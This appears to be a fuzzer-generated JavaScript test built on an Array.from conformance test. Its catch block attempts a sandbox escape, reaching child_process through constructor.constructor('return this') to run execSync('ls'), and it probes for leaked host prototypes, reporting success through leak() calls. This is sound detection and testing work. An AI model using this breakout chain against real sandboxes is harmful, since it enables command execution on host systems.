try {
    var arrayIndex = -1;
    var originalLength = 7;
    var obj = {
        length: originalLength,
        0: 2,
        1: 4,
        2: 8,
        3: 16,
        4: 32,
        5: 64,
        6: 128
    };
    var array = [
        2,
        4,
        8,
        16,
        32,
        64,
        128
    ];
    function mapFn(value, index) {
        throw () => {
            return () => {
            };
        };
        arrayIndex++;
        assert.sameValue(value, obj[arrayIndex], 'Value mismatch in mapFn at index ' + index + '.');
        assert.sameValue(index, arrayIndex, 'Index mismatch in mapFn.');
        obj[originalLength + arrayIndex] = 2 * arrayIndex + 1;
        return obj[arrayIndex];
    }
    var a = Array.from(obj, mapFn);
    assert.sameValue(a.length, array.length, 'Length mismatch.');
    for (var j = 0; j < a.length; j++) {
        assert.sameValue(a[j], array[j], 'Element mismatch for array at index ' + j + '.');
    }
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}